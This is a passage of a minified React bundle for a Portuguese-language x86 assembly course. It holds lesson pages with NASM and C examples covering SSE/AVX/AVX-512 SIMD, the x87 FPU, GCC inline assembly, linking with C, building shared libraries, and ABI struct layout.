cmpltps xmm2, xmm0    ; máscara: 0xFFFFFFFF onde xmm0 > 0
andps xmm0, xmm2       ; aplica máscara`}),r.jsx("h2",{children:"Shuffling e Permutação"}),r.jsx(d,{language:"nasm",filename:"sse_shuffle.asm",code:`; SHUFPS — reordena elementos
; shufps dest, src, imm8
; imm8 define qual elemento vai para qual posição

; xmm0 = [a, b, c, d]
shufps xmm0, xmm0, 0b00000000  ; xmm0 = [a, a, a, a] (broadcast)
shufps xmm0, xmm0, 0b11100100  ; identidade: [a, b, c, d]
shufps xmm0, xmm0, 0b00011011  ; reverso: [d, c, b, a]
shufps xmm0, xmm0, 0b00000101  ; [b, a, b, a]

; PSHUFD — shuffle de 32-bit integers
pshufd xmm0, xmm0, 0x00   ; broadcast elemento 0 para todos

; PSHUFB (SSSE3) — shuffle de bytes com tabela
; xmm1 = máscara de índices
pshufb xmm0, xmm1          ; reordena bytes`}),r.jsx("h2",{children:"Operações Horizontais"}),r.jsx(d,{language:"nasm",filename:"sse_hori.asm",code:`; HADDPS (SSE3) — soma horizontal (pares adjacentes)
; xmm0 = [a0, a1, a2, a3]
; xmm1 = [b0, b1, b2, b3]
; resultado: [a0+a1, a2+a3, b0+b1, b2+b3]
haddps xmm0, xmm1

; Dot product de 4 floats:
mulps  xmm0, xmm1     ; [a0*b0, a1*b1, a2*b2, a3*b3]
haddps xmm0, xmm0     ; [a0*b0+a1*b1, a2*b2+a3*b3, ...]
haddps xmm0, xmm0     ; [sum, sum, sum, sum]
; xmm0[0] = dot product

; DPPS (SSE4.1) — dot product direto!
dpps xmm0, xmm1, 0xF1   ; soma todos os 4, resultado em [0]`}),r.jsx("h2",{children:"Conversões"}),r.jsx(d,{language:"nasm",filename:"sse_conv.asm",code:`; Float → Integer:
cvttps2dq xmm0, xmm1   ; truncate float → int32 (empacotado)
cvtps2dq  xmm0, xmm1   ; arredondado float → int32

; Integer → Float:
cvtdq2ps  xmm0, xmm1   ; int32 → float

; Float32 ↔ Float64:
cvtps2pd  xmm0, xmm1   ; 2 floats → 2 doubles (low half de xmm1)
cvtpd2ps  xmm0, xmm1   ; 2 doubles → 2 floats

; Scalar (apenas elemento 0):
cvtss2sd  xmm0, xmm1   ; float → double
cvtsd2ss  xmm0, xmm1   ; double → float
cvtsi2ss  xmm0, rax    ; int64 → float
cvtsi2sd  xmm0, rax    ; int64 → double
cvtss2si  rax, xmm0    ; float → int64 (arredondado)
cvttss2si rax, xmm0    ; float → int64 (truncado)`}),r.jsx("h2",{children:"Operações com Inteiros SSE2"}),r.jsx(d,{language:"nasm",filename:"sse2_int.asm",code:`; SSE2 adicionou suporte a inteiros em XMM:
; XMM pode conter: 16×byte, 8×word, 4×dword, 2×qword

; Adição de bytes (saturada — sem overflow):
paddb  xmm0, xmm1    ; byte sem sinal
paddsb xmm0, xmm1    ; byte com sinal saturado
paddusb xmm0, xmm1   ; byte sem sinal saturado

; Adição de words:
paddw  xmm0, xmm1    ; 8 palavras de 16-bit
paddsw xmm0, xmm1    ; saturado com sinal
paddusw xmm0, xmm1   ; saturado sem sinal

; Adição de dwords:
paddd  xmm0, xmm1    ; 4 inteiros de 32-bit

; Adição de qwords:
paddq  xmm0, xmm1    ; 2 inteiros de 64-bit

; Multiplicação de words → resultados de 32-bit:
pmullw xmm0, xmm1    ; multiplica 8 pares de 16-bit → bits baixos
pmulhw xmm0, xmm1    ; bits altos do resultado de 32-bit
pmaddwd xmm0, xmm1   ; multiply-add words → dwords`}),r.jsx(T,{type:"success",title:"SSE para iniciantes SIMD",children:"Comece com operações simples: addps, mulps, loadaps/movups. Só depois explore shuffles e comparações. A maioria dos ganhos de performance vem do simples fato de processar 4 floats por instrução."})]})}function d1(){return r.jsxs(L,{title:"AVX e AVX-512",subtitle:"Vetores de 256-bit e 512-bit — o estado da arte em SIMD",difficulty:"expert",timeToRead:"18 min",children:[r.jsx("p",{children:"AVX (Advanced Vector Extensions) dobrou o tamanho dos registradores SIMD para 256-bit. AVX-512 triplicou para 512-bit e adicionou recursos poderosos como operações mascaradas e mais registradores."}),r.jsx("h2",{children:"AVX — 256-bit com Registradores YMM"}),r.jsx(d,{language:"nasm",filename:"avx_basico.asm",code:`; AVX usa registradores YMM (256-bit = 8 floats ou 4 doubles)
; Instrução AVX tem 3 operandos (não-destrutivo!): dest, src1, src2
; VEX prefix permite operandos separados

; SSE (destructive — modifica src):
addps xmm0, xmm1          ; xmm0 = xmm0 + xmm1 ← xmm0 é modificado!

; AVX (non-destructive — 3 operandos):
vaddps ymm0, ymm1, ymm2   ; ymm0 = ymm1 + ymm2 ← ymm1 preservado!

; Equivalente em 256-bit (8 floats de uma vez):
vmovaps ymm0, [a]          ; carregar 8 floats (alinhado)
vmovaps ymm1, [b]
vaddps  ymm2, ymm0, ymm1   ; ymm2[i] = ymm0[i] + ymm1[i], 8 de uma vez
vmovaps [result], ymm2

; Comparar com SSE (4 floats):
movaps xmm0, [a]
movaps xmm1, [b]
addps  xmm0, xmm1
movaps [result], xmm0
; AVX processa o DOBRO com mesma latência!`}),r.jsx("h2",{children:"Loop AVX Vetorizado"}),r.jsx(d,{language:"nasm",filename:"avx_loop.asm",code:`; Multiplicar dois arrays de floats (8 por iteração):
; C: for (int i = 0; i < N; i++) c[i] = a[i] * b[i];
; rdi=a, rsi=b, rdx=c, rcx=N (múltiplo de 8)

mul_arrays_avx:
    shr rcx, 3              ; rcx = N / 8 (iterações)
.loop:
    vmovaps ymm0, [rdi]     ; carregar 8 floats de 'a'
    vmovaps ymm1, [rsi]     ; carregar 8 floats de 'b'
    vmulps  ymm2, ymm0, ymm1 ; multiplicar 8 pares
    vmovaps [rdx], ymm2     ; salvar 8 resultados

    add rdi, 32             ; avançar 32 bytes (8 floats × 4 bytes)
    add rsi, 32
    add rdx, 32
    dec rcx
    jnz .loop

    ; IMPORTANTE: limpar estado AVX para evitar penalidades SSE/AVX:
    vzeroupper              ; zera bits superiores de YMM0-YMM15
    ret`}),r.jsxs(T,{type:"warning",title:"VZEROUPPER é obrigatório!",children:["Ao misturar código AVX (que usa YMM) com código SSE (que usa XMM), SEMPRE execute ",r.jsx("code",{children:"VZEROUPPER"})," antes de chamar funções que usam SSE. Sem isso, pode haver penalidades de performance massivas (dezenas de ciclos por instrução SSE)."]}),r.jsx("h2",{children:"FMA — Fused Multiply-Add"}),r.jsx(d,{language:"nasm",filename:"fma.asm",code:`; FMA (Fused Multiply-Add) — a*b + c em UMA instrução!
; Mais rápido que mul+add separados E mais preciso (sem arredondamento intermediário)

; VFMADD231PS — result = src1 * src2 + dest
vfmadd213ps ymm0, ymm1, ymm2  ; ymm0 = ymm0 * ymm1 + ymm2
vfmadd231ps ymm0, ymm1, ymm2  ; ymm0 = ymm1 * ymm2 + ymm0
vfmadd132ps ymm0, ymm1, ymm2  ; ymm0 = ymm0 * ymm2 + ymm1

; Variantes:
; VFMSUB — multiply-subtract: a*b - c
; VFNMADD — negative multiply-add: -(a*b) + c
; VFNMSUB — negative multiply-subtract: -(a*b) - c
; Sufixo S = scalar, P = packed, D = double, S = single

; Exemplo prático: produto escalar (dot product) rápido:
; float dot = 0;
; for i: dot += a[i] * b[i]
    vxorps ymm2, ymm2, ymm2     ; acumulador = 0
.loop:
    vmovaps ymm0, [rdi]
    vmovaps ymm1, [rsi]
    vfmadd231ps ymm2, ymm0, ymm1 ; acumulador += a[i]*b[i] (8 de uma vez!)
    add rdi, 32
    add rsi, 32
    dec rcx
    jnz .loop

    ; Somar os 8 valores do acumulador:
    vextractf128 xmm0, ymm2, 1  ; extrair high 128-bit
    vaddps xmm0, xmm0, xmm2    ; somar com low 128-bit
    vhaddps xmm0, xmm0, xmm0   ; somar pares
    vhaddps xmm0, xmm0, xmm0   ; resultado em xmm0[0]`}),r.jsx("h2",{children:"AVX-512 — 512-bit com ZMM"}),r.jsx(T,{type:"info",title:"Disponibilidade",children:"AVX-512 está disponível em Intel Ice Lake e posteriores (desktop), Xeon Phi, e alguns AMD EPYC. Muitos processadores consumer ainda não têm AVX-512."}),r.jsx(d,{language:"nasm",filename:"avx512.asm",code:`; AVX-512 features principais:
; 32 registradores ZMM (ZMM0-ZMM31, 512-bit cada)
; 8 registradores de máscara (K0-K7)
; Operações mascaradas (apply only to selected elements)
; Embedded broadcasting (operand from memory = 1 value broadcast to all)

; Operação mascarada — processa apenas elementos onde K1 tem 1:
vmovaps zmm0 {k1}, [rdi]          ; carrega apenas elementos mascarados
vaddps  zmm0 {k1}{z}, zmm1, zmm2  ; soma com máscara e zeroing

; Criar máscara:
vpcmpd k1, zmm0, zmm1, 0   ; k1[i] = (zmm0[i] == zmm1[i])

; Broadcast de memória (sem instrução separada de broadcast!):
vaddps zmm0, zmm1, [rdi]{1to16}  ; soma zmm1 com [rdi] brodcastado para 16 floats

; AVX-512 loop (16 floats por iteração!):
.loop:
    vmovaps zmm0, [rdi]         ; 16 floats
    vmovaps zmm1, [rsi]         ; 16 floats
    vfmadd231ps zmm2, zmm0, zmm1 ; FMA com 16 floats de uma vez!
    add rdi, 64
    add rsi, 64
    dec rcx
    jnz .loop`}),r.jsx("h2",{children:"Alinhamento de Memória"}),r.jsx(d,{language:"nasm",filename:"alinhamento_simd.asm",code:`; AVX requer alinhamento de 32 bytes para VMOVAPS
; AVX-512 requer alinhamento de 64 bytes para VMOVAPS (ZMM)

section .data
    align 32             ; alinhado para AVX
    vetor: dd 1.0, 2.0, 3.0, 4.0, 5.0, 6.0, 7.0, 8.0

section .bss
    align 64             ; alinhado para AVX-512
    resultado: resd 16

section .text
    ; Use VMOVUPS para acesso não alinhado (mais lento):
    vmovups ymm0, [rdi]  ; funciona mesmo sem alinhamento`})]})}function m1(){return r.jsxs(L,{title:"x87 FPU",subtitle:"A unidade de ponto flutuante legada — 80-bit extended precision",difficulty:"avancado",timeToRead:"15 min",children:[r.jsxs("p",{children:["O ",r.jsx("strong",{children:"x87 FPU"})," (Floating-Point Unit) é o coprossador de ponto flutuante original do x86, introduzido no Intel 8087 (1980). Usa precisão estendida de 80 bits e uma pilha de 8 registradores (ST0-ST7)."]}),r.jsx(T,{type:"info",title:"x87 vs SSE",children:"Em código moderno, SSE/AVX são preferidos para ponto flutuante. x87 ainda é relevante para precisão estendida (80-bit), aritmética BCD, e compatibilidade com código legado. O compilador GCC usa SSE por padrão em x86-64."}),r.jsx("h2",{children:"Pilha de Registradores x87"}),r.jsx(d,{language:"bash",code:`; x87 usa uma pilha de 8 registradores de 80-bit:
; ST(0) = topo da pilha (top of stack)
; ST(1) = segundo elemento
; ...
; ST(7) = oitavo elemento

; Características dos 80-bit extended:
; 1 bit: sinal
; 15 bits: expoente (bias = 16383)
; 64 bits: mantissa (sem bit implícito, como IEEE 754!)
; Precisão: ~18-19 dígitos decimais (vs 15-16 de double)`}),r.jsx("h2",{children:"Instruções Básicas x87"}),r.jsx(d,{language:"nasm",filename:"fpu_basico.asm",code:`; CARREGAR (push na pilha FPU):
fld  [variavel_float]   ; push float (32-bit) → ST(0)
fldl [variavel_double]  ; push double (64-bit) → ST(0)
fldt [variavel_ext]     ; push extended (80-bit) → ST(0)
fld1                    ; push 1.0
fldz                    ; push 0.0
fldpi                   ; push π (3.141592...)
fldl2e                  ; push log2(e)
fldl2t                  ; push log2(10)

; SALVAR (pop da pilha FPU):
fstp  [variavel_float]  ; pop ST(0) → float (32-bit)
fstpl [variavel_double] ; pop ST(0) → double (64-bit)
fstpt [variavel_ext]    ; pop ST(0) → extended (80-bit)
fst   [variavel]        ; salva ST(0) sem pop

; ARITMÉTICA:
fadd  [mem]             ; ST(0) += mem
fadd  st(0), st(1)      ; ST(0) += ST(1)
faddp                   ; ST(1) += ST(0), pop ST(0)
fsub  [mem]             ; ST(0) -= mem
fmul  [mem]             ; ST(0) *= mem
fdiv  [mem]             ; ST(0) /= mem
fsqrt                   ; ST(0) = sqrt(ST(0))
fabs                    ; ST(0) = |ST(0)|
fchs                    ; ST(0) = -ST(0)
frndint               ; ST(0) = arredondar para inteiro`}),r.jsx("h2",{children:"Exemplo: Cálculo com x87"}),r.jsx(d,{language:"nasm",filename:"fpu_exemplo.asm",code:`; Calcular: resultado = sqrt(a*a + b*b) (hipotenusa)
section .data
    a  dd 3.0       ; float 3.0
    b  dd 4.0       ; float 4.0
    res dq 0.0      ; double para resultado

section .text
    fldl [a]         ; ST(0) = a (loadou como extended)
    fmul st(0), st(0) ; ST(0) = a*a = 9.0

    fldl [b]         ; ST(0) = b, ST(1) = a*a
    fmul st(0), st(0) ; ST(0) = b*b = 16.0

    fadd             ; ST(0) = a*a + b*b = 25.0 (pop ST(0) e ST(1))
    fsqrt            ; ST(0) = sqrt(25.0) = 5.0

    fstpl [res]      ; salva como double, pop ST(0)
    ; res = 5.0`}),r.jsx("h2",{children:"Comparações x87"}),r.jsx(d,{language:"nasm",filename:"fpu_cmp.asm",code:`; Comparação x87 (afeta flags na FPU, não FLAGS do CPU!):
fcom  [mem]       ; compara ST(0) com memória
fcomp [mem]       ; compara e pop
fcompp            ; compara ST(0) e ST(1) e pop ambos

; Para usar resultado da comparação:
fcom  [valor]
fnstsw ax          ; move FPU status word para AX
sahf               ; copia AH para FLAGS do CPU
ja  .maior         ; agora JCC funciona!
; (cf, pf, zf das flags do FPU estão no AH após fnstsw + sahf)

; Alternativa mais simples (Pentium Pro+):
fucomi st(0), st(1) ; compara e seta FLAGS diretamente!
jb .menor`}),r.jsx("h2",{children:"Controle de Precisão"}),r.jsx(d,{language:"nasm",filename:"fpu_ctrl.asm",code:`; FPU Control Word controla a precisão e arredondamento:
fstcw [ctrl_word]    ; ler control word
fldcw [nova_ctrl]    ; carregar nova control word

; Bits do Control Word:
; Bits 8-9: PC (Precision Control)
;   00 = 24-bit (single precision)
;   10 = 53-bit (double precision)
;   11 = 64-bit (extended precision — padrão)
; Bits 10-11: RC (Rounding Control)
;   00 = Round to nearest (padrão)
;   01 = Round down (toward -∞)
;   10 = Round up (toward +∞)
;   11 = Round toward zero (truncate)

; Setar modo de truncamento:
fstcw ax             ; salva control word
or  ax, 0x0C00       ; seta RC = 11 (truncamento)
fldcw ax

ftst                 ; testa ST(0) contra zero (seta FPU flags)
fxam                 ; examina ST(0) (NaN? Infinito? Zero? Normal?)`})]})}function u1(){return r.jsxs(L,{title:"Assembly Inline em C/C++",subtitle:"Integrando Assembly diretamente no código C com asm() do GCC",difficulty:"avancado",timeToRead:"20 min",children:[r.jsx("p",{children:"Assembly inline permite inserir instruções Assembly diretamente dentro de código C/C++. É o caminho mais comum para otimizações pontuais sem reescrever um programa inteiro em Assembly."}),r.jsx("h2",{children:"Sintaxe Básica (GCC)"}),r.jsx(d,{language:"c",filename:"inline_basico.c",code:`// Forma simples (sem operandos):
asm("instrução");
asm("nop");           // No-operation
asm("cli");           // Clear interrupt flag (kernel only)
asm("hlt");           // Halt
asm("cpuid");         // CPU identification

// Múltiplas instruções (use \\n\\t entre elas):
asm("xor %eax, %eax\\n\\t"
    "xor %ebx, %ebx\\n\\t"
    "xor %ecx, %ecx");

// __asm__ é sinônimo de asm (evita conflitos com código C++):
__asm__("nop");`}),r.jsx("h2",{children:"Sintaxe Estendida com Operandos"}),r.jsx(d,{language:"c",filename:"inline_extendido.c",code:`// Sintaxe completa:
asm volatile (
    "instruções"
    : outputs          // lista de saídas
    : inputs           // lista de entradas
    : clobbers         // registradores/memória modificados
);

// Exemplo: ler TSC (Time Stamp Counter) — ciclos de CPU
uint64_t rdtsc() {
    uint32_t lo, hi;
    asm volatile (
        "rdtsc"
        : "=a"(lo),    // output: EAX → lo
          "=d"(hi)     // output: EDX → hi
        :              // sem inputs
        :              // sem clobbers
    );
    return ((uint64_t)hi << 32) | lo;
}

// Exemplo: soma dois inteiros com ADD Assembly:
int soma_asm(int a, int b) {
    int resultado;
    asm volatile (
        "addl %2, %1"   // %1 = b, %2 = a: b += a
        : "=r"(resultado)  // output: qualquer registrador → resultado
        : "r"(b), "r"(a)   // inputs: b em %1, a em %2
    );
    return resultado;
}`}),r.jsx("h2",{children:"Constraints (Restrições de Operandos)"}),r.jsx(d,{language:"bash",code:`# Constraints de OUTPUT:
"=r"(var)    # qualquer registrador geral
"=m"(var)    # operando de memória
"=a"(var)    # especificamente EAX/RAX
"=b"(var)    # especificamente EBX/RBX
"=c"(var)    # especificamente ECX/RCX
"=d"(var)    # especificamente EDX/RDX
"=S"(var)    # especificamente ESI/RSI
"=D"(var)    # especificamente EDI/RDI
"=q"(var)    # registrador de byte (a,b,c,d)
"=Q"(var)    # registrador com parte high byte (a,b,c,d)
"+"(var)     # input e output no mesmo registrador

# Constraints de INPUT:
"r"(var)     # qualquer registrador
"m"(var)     # operando de memória
"i"(val)     # imediato (constante)
"0"          # mesmo registrador que operando 0
"a"(var)     # especificamente EAX/RAX

# Clobbers:
"eax","rbx"  # modificamos esses registradores
"memory"     # modificamos memória (barreira de memória)
"cc"         # modificamos as flags (FLAGS register)`}),r.jsx("h2",{children:"Exemplos Práticos"}),r.jsx(d,{language:"c",filename:"inline_pratico.c",code:`#include <stdint.h>
#include <stdbool.h>

// Rotação de bits (sem operador nativo em C!)
uint32_t rotl32(uint32_t value, int shift) {
    uint32_t result;
    asm volatile (
        "roll %%cl, %0"
        : "=r"(result)
        : "0"(value), "c"(shift)  // "c" = especificamente CL/RCX
    );
    return result;
}

// Inverter ordem dos bytes (bswap):
uint64_t bswap64(uint64_t x) {
    asm volatile ("bswapq %0" : "+r"(x));
    return x;
}

// Ler CR3 (kernel mode only):
uint64_t get_cr3() {
    uint64_t cr3;
    asm volatile ("mov %%cr3, %0" : "=r"(cr3));
    return cr3;
}

// Teste de bit (BT instruction):
bool test_bit(uint64_t value, int bit) {
    bool result;
    asm volatile (
        "btq %2, %1\\n\\t"   // BT: bit de 'value' no índice 'bit' → CF
        "setc %0"            // SETC: CF → result (0 ou 1)
        : "=qm"(result)
        : "r"(value), "r"((uint64_t)bit)
        : "cc"
    );
    return result;
}

// CPUID:
void cpuid(uint32_t leaf, uint32_t *eax, uint32_t *ebx,
           uint32_t *ecx, uint32_t *edx) {
    asm volatile (
        "cpuid"
        : "=a"(*eax), "=b"(*ebx), "=c"(*ecx), "=d"(*edx)
        : "a"(leaf)
    );
}`}),r.jsx("h2",{children:"volatile — Por que é Necessário"}),r.jsxs(T,{type:"warning",title:"asm volatile",children:[r.jsx("code",{children:"asm volatile"}),' diz ao compilador: "não otimize, mova, ou elimine esta instrução". Sem ',r.jsx("code",{children:"volatile"}),", o compilador pode reordenar ou remover o bloco asm se achar que o resultado não é usado."]}),r.jsx(d,{language:"c",filename:"volatile.c",code:`// Sem volatile — PERIGOSO: compilador pode eliminar ou reordenar:
asm("mfence");         // barreira de memória — pode ser eliminada!

// Com volatile — SEGURO:
asm volatile("mfence" ::: "memory");  // garante execução E barreira de memória

// Sequência de operações que precisa ser preservada:
uint64_t start, end;
asm volatile("rdtsc" : "=A"(start));   // inicia medição
// ... código a medir ...
asm volatile("rdtsc" : "=A"(end));     // finaliza medição
// Sem volatile, o compilador poderia reordenar!`}),r.jsx("h2",{children:"Sintaxe Intel no GCC Inline"}),r.jsx(d,{language:"c",filename:"intel_inline.c",code:`// Usar sintaxe Intel no GCC inline (GCC 9+):
int main() {
    int x = 5;
    asm volatile (
        ".intel_syntax noprefix\\n\\t"
        "mov eax, %0\\n\\t"   // sintaxe Intel!
        "add eax, 3\\n\\t"
        ".att_syntax prefix\\n\\t"  // voltar para AT&T
        :
        : "r"(x)
        : "eax"
    );
    return 0;
}`})]})}function x1(){return r.jsxs(L,{title:"Linking com C",subtitle:"Combinando módulos Assembly com código C para programas completos",difficulty:"intermediario",timeToRead:"15 min",children:[r.jsx("p",{children:"A integração entre Assembly e C é essencial para projetos reais. Você pode escrever funções críticas em Assembly e chamá-las de C, ou chamar funções da libc a partir do Assembly."}),r.jsx("h2",{children:"Chamando funções C a partir do Assembly"}),r.jsx(d,{language:"nasm",filename:"call_c.asm",code:`; Chamar printf() da libc
section .data
    fmt db "Número: %d, Float: %f", 10, 0
    pi  dq 3.14159

section .text
    global _start
    extern printf, exit

_start:
    ; Alinhar stack (deve ser múltiplo de 16 antes do CALL)
    sub rsp, 8          ; alinhar (RSP estava alinhado, -8 = múltiplo de 16 após push retorno)

    ; printf("Número: %d, Float: %f
", 42, 3.14159)
    lea rdi, [rel fmt]      ; 1º arg: format string
    mov rsi, 42             ; 2º arg: inteiro
    movsd xmm0, [rel pi]    ; float arg: pi
    mov rax, 1              ; IMPORTANTE: número de args XMM passados = 1
    call printf

    ; exit(0)
    xor edi, edi
    call exit`}),r.jsx("h2",{children:"Função Assembly chamada de C"}),r.jsx(d,{language:"nasm",filename:"funcao_asm.asm",code:`; funcao_asm.asm — funções Assembly para usar em C
section .text
    global soma_inteiros
    global multiplica
    global strlen_asm

; long soma_inteiros(long a, long b)
soma_inteiros:
    lea rax, [rdi + rsi]    ; rax = a + b
    ret

; long multiplica(long a, long b)  
multiplica:
    mov rax, rdi
    imul rax, rsi           ; rax = a * b
    ret

; size_t strlen_asm(const char *s)
strlen_asm:
    xor rax, rax            ; contador = 0
.loop:
    cmp byte [rdi + rax], 0 ; null terminator?
    je  .fim
    inc rax
    jmp .loop
.fim:
    ret`}),r.jsx(d,{language:"c",filename:"main.c",code:`// main.c — usa funções Assembly
#include <stdio.h>
#include <stddef.h>

// Declarações das funções Assembly:
extern long soma_inteiros(long a, long b);
extern long multiplica(long a, long b);
extern size_t strlen_asm(const char *s);

int main() {
    long s = soma_inteiros(10, 20);
    long m = multiplica(6, 7);
    size_t len = strlen_asm("Hello World");

    printf("Soma: %ld\\n", s);       // 30
    printf("Produto: %ld\\n", m);    // 42
    printf("Strlen: %zu\\n", len);   // 11
    return 0;
}`}),r.jsx(d,{language:"bash",code:`# Compilar e linkar:
nasm -f elf64 funcao_asm.asm -o funcao_asm.o
gcc main.c funcao_asm.o -o programa
./programa`}),r.jsx("h2",{children:"Makefile para Projetos Mistos"}),r.jsx(d,{language:"makefile",filename:"Makefile",code:`CC = gcc
ASM = nasm
CFLAGS = -O2 -Wall -g
ASMFLAGS = -f elf64 -g

SRCS_C = main.c utils.c
SRCS_ASM = funcao_asm.asm strlen.asm

OBJS_C = $(SRCS_C:.c=.o)
OBJS_ASM = $(SRCS_ASM:.asm=.o)
OBJS = $(OBJS_C) $(OBJS_ASM)

programa: $(OBJS)
	$(CC) $(OBJS) -o $@

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

%.o: %.asm
	$(ASM) $(ASMFLAGS) $< -o $@

clean:
	rm -f $(OBJS) programa

.PHONY: clean`}),r.jsx("h2",{children:"Usando libc sem _start"}),r.jsx(d,{language:"nasm",filename:"com_libc.asm",code:`; Para usar libc (malloc, printf, etc.), use 'main' em vez de '_start'
; e linke com GCC (não ld diretamente)

section .data
    fmt db "Hello de Assembly via libc!", 10, 0

section .text
    global main
    extern printf

; int main(int argc, char *argv[])
; argc = edi (int), argv = rsi
main:
    push rbp
    mov  rbp, rsp
    sub  rsp, 16        ; alinhar stack

    lea rdi, [rel fmt]
    xor eax, eax        ; 0 args XMM
    call printf

    xor eax, eax        ; return 0
    leave
    ret`}),r.jsx(d,{language:"bash",code:`# Linkar com GCC para obter libc:
nasm -f elf64 com_libc.asm -o com_libc.o
gcc com_libc.o -o programa    # GCC adiciona libc automaticamente
./programa`}),r.jsxs(T,{type:"info",title:"ld vs gcc para linkar",children:["Use ",r.jsx("code",{children:"ld"})," quando quiser controle total sem libc (para programas que usam syscalls diretamente). Use ",r.jsx("code",{children:"gcc"})," para linkar quando quiser usar funções da libc (printf, malloc, etc.) — GCC adiciona os caminhos e bibliotecas necessários automaticamente."]})]})}function p1(){return r.jsxs(L,{title:"Exportando Funções",subtitle:"Criando bibliotecas compartilhadas em Assembly",difficulty:"avancado",timeToRead:"12 min",children:[r.jsx("p",{children:"Funções Assembly podem ser empacotadas em bibliotecas compartilhadas (.so no Linux, .dll no Windows) para reutilização em qualquer linguagem."}),r.jsx("h2",{children:"Criando uma Biblioteca Compartilhada"}),r.jsx(d,{language:"nasm",filename:"libmatix.asm",code:`; libmatix.asm — biblioteca de operações matemáticas em Assembly
section .text

; Exportar símbolos para uso externo:
global matix_soma
global matix_multiplica
global matix_fatorial
global matix_potencia

; long matix_soma(long a, long b)
matix_soma:
    lea rax, [rdi + rsi]
    ret

; long matix_multiplica(long a, long b)
matix_multiplica:
    mov rax, rdi
    imul rax, rsi
    ret

; long matix_fatorial(long n)
matix_fatorial:
    mov rax, 1          ; acumulador
    cmp rdi, 1
    jle .fim
.loop:
    imul rax, rdi
    dec rdi
    cmp rdi, 1
    jg .loop
.fim:
    ret

; long matix_potencia(long base, long exp)
matix_potencia:
    ; base = rdi, exp = rsi, resultado = rax
    mov rax, 1          ; rax = 1 (resultado)
    test rsi, rsi
    jz  .fim
.loop:
    imul rax, rdi       ; rax *= base
    dec rsi
    jnz .loop
.fim:
    ret`}),r.jsx(d,{language:"bash",filename:"build_lib.sh",code:`# Compilar a .so (shared object):
# -fPIC = Position Independent Code (obrigatório para .so)
nasm -f elf64 -fPIC libmatix.asm -o libmatix.o

# Criar a biblioteca compartilhada:
ld -shared -o libmatix.so libmatix.o

# Verificar símbolos exportados:
nm -D libmatix.so

# Usar a biblioteca em C:
gcc main.c -L. -lmatix -Wl,-rpath,. -o programa
./programa`}),r.jsx(d,{language:"c",filename:"main_lib.c",code:`// Usar a biblioteca Assembly em C:
#include <stdio.h>

extern long matix_soma(long a, long b);
extern long matix_multiplica(long a, long b);
extern long matix_fatorial(long n);
extern long matix_potencia(long base, long exp);

int main() {
    printf("Soma(10, 5) = %ld\\n", matix_soma(10, 5));         // 15
    printf("Mult(6, 7) = %ld\\n", matix_multiplica(6, 7));     // 42
    printf("Fat(10) = %ld\\n", matix_fatorial(10));            // 3628800
    printf("Pot(2, 10) = %ld\\n", matix_potencia(2, 10));      // 1024
    return 0;
}`}),r.jsx("h2",{children:"Criando uma DLL no Windows"}),r.jsx(d,{language:"nasm",filename:"libmatix_win.asm",code:`; libmatix_win.asm — DLL para Windows
global matix_soma
global matix_multiplica
global DllMain

section .text

; DllMain — ponto de entrada da DLL (obrigatório no Windows)
; hinstDLL = rcx, fdwReason = rdx, lpvReserved = r8
DllMain:
    mov eax, 1          ; return TRUE
    ret

; As funções usam Microsoft x64 ABI (rcx, rdx, r8, r9...)!
matix_soma:
    lea rax, [rcx + rdx]   ; a=rcx, b=rdx (não rdi, rsi!)
    ret

matix_multiplica:
    mov rax, rcx
    imul rax, rdx
    ret`}),r.jsx(d,{language:"bash",code:`# No Windows com NASM e MinGW:
nasm -f win64 libmatix_win.asm -o libmatix_win.obj
gcc -shared -o libmatix.dll libmatix_win.obj -Wl,--kill-at`})]})}function h1(){return r.jsxs(L,{title:"ABI — Application Binary Interface",subtitle:"Struct layout, alinhamento e compatibilidade binária entre compiladores",difficulty:"avancado",timeToRead:"15 min",children:[r.jsxs("p",{children:["A ",r.jsx("strong",{children:"ABI"})," (Application Binary Interface) define como funções se comunicam em nível binário: passagem de argumentos, valores de retorno, layout de structs, alinhamento e mais. Duas linguagens só podem se comunicar se seguirem a mesma ABI."]}),r.jsx("h2",{children:"Componentes da ABI"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Calling convention:"})," Como argumentos são passados e retornados"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Register usage:"})," Quais registradores são caller/callee-saved"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Stack alignment:"})," Requisito de alinhamento antes de CALL"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Struct layout:"})," Tamanho, alinhamento e padding de cada campo"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Name mangling:"})," Como nomes de funções são codificados no binário"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Exception handling:"})," Como exceções C++ propagam"]})]}),r.jsx("h2",{children:"Struct Layout e Alinhamento"}),r.jsx(d,{language:"bash",code:`# Regra geral do System V x86-64 ABI para structs:
# Cada campo é alinhado ao MENOR de: (seu tamanho, 8 bytes)
# A struct é alinhada ao maior alinhamento de seus campos

# Exemplo:
# struct A {
#   char   c;  // 1 byte, alinhado a 1 → offset 0
#              // padding: 3 bytes (para alinhar int)
#   int    i;  // 4 bytes, alinhado a 4 → offset 4
#   double d;  // 8 bytes, alinhado a 8 → offset 8
# };
# sizeof(A) = 16 bytes (c=1 + pad=3 + i=4 + d=8)

# Verificar com GCC:
python3 -c "
import ctypes
class A(ctypes.Structure):
    _fields_ = [('c', ctypes.c_char),
                ('i', ctypes.c_int),
                ('d', ctypes.c_double)]
print('sizeof A:', ctypes.sizeof(A))  # 16
print('offset i:', A.i.offset)        # 4
print('offset d:', A.d.offset)        # 8
"`}),r.jsx("h2",{children:"Passar Structs como Argumento"}),r.jsx(d,{language:"bash",code:`# Structs pequenas (≤ 16 bytes) passadas em registradores:
# Struct de 2 campos (int, int) = 8 bytes → em RDI
# Struct de 2 campos (long, long) = 16 bytes → em RDI:RSI
# Struct > 16 bytes → caller aloca espaço e passa ponteiro

# Exemplo:
# struct Point { int x, y; };  → 8 bytes → passado em RDI (não na stack!)
# struct Point p = {1, 2};
# foo(p);   → foo(RDI=0x00000002_00000001) (little-endian!)

# Struct grande (> 16 bytes) → ponteiro implícito:
# struct Big { long a, b, c; };  → 24 bytes → caller passa &big em RDI
# void foo(struct Big b);  → compilado como: void foo(struct Big *b);
# "hidden first argument"`}),r.jsx("h2",{children:"Name Mangling em C++"}),r.jsx(d,{language:"bash",code:`# C++ altera os nomes de funções para incluir tipos:
# Permite overloading mas complica interoperabilidade

# C:  void foo(int x);  → símbolo: "foo"
